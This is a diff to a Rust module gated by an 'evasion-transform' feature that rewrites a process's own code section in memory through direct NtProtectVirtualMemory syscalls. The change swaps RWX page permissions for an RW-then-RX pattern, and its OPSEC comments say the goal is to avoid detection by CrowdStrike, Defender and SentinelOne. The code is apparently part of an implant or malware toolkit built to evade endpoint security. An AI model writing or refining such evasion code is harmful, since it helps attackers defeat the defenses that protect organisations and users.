@@ -41,7 +41,9 @@
 //!   happen on decrypted `.text` only
 //! - Uses `self_reencode::find_text_section()` for safe `.text` discovery
 //! - All page protection changes go through `NtProtectVirtualMemory` (direct
-//!   syscall) and are restored after transformation
+//!   syscall) and are restored after transformation.  Uses the RW→write→RX
+//!   pattern — never creates PAGE_EXECUTE_READWRITE pages (RWX is the #1 EDR
+//!   signal; CrowdStrike, Defender, SentinelOne all flag it)
 //!
 //! # Config
 //!
@@ -54,6 +56,10 @@
 //! ```
 
 #![cfg(feature = "evasion-transform")]
+
+// Static assertion: PAGE_READWRITE (0x04) must never be confused with
+// PAGE_EXECUTE_READWRITE (0x40).  RWX pages are the #1 EDR signal.
+const _: () = assert!(0x04u32 != 0x40u32, "PAGE_READWRITE must differ from PAGE_EXECUTE_READWRITE");
 
 use anyhow::{bail, Context, Result};
 use once_cell::sync::Lazy;
@@ -956,8 +962,15 @@ fn hash_text(text: &[u8]) -> String {
 
 // ── Page protection ─────────────────────────────────────────────────────────
 
-/// Make a memory region writable (RWX) for transformation, returning the
-/// original protection.
+/// Make a memory region writable (RW) for transformation, returning the
+/// original protection (typically PAGE_EXECUTE_READ for .text sections).
+///
+/// # OPSEC
+///
+/// Uses PAGE_READWRITE (0x04), never PAGE_EXECUTE_READWRITE (0x40).
+/// RWX pages are the single most monitored memory protection change by
+/// EDR products (CrowdStrike Falcon, Microsoft Defender for Endpoint,
+/// SentinelOne).  The pattern is: save → RW → write → restore to saved.
 ///
 /// # Safety
 ///
@@ -970,7 +983,7 @@ unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
         (-1i64) as u64, // NtCurrentProcess()
         &mut (base as *mut std::ffi::c_void),
         &mut (size as usize),
-        0x40u32, // PAGE_EXECUTE_READWRITE
+        0x04u32, // PAGE_READWRITE — never RWX (EDR signal)
         &mut old_protect,
     );
     if status != 0 {
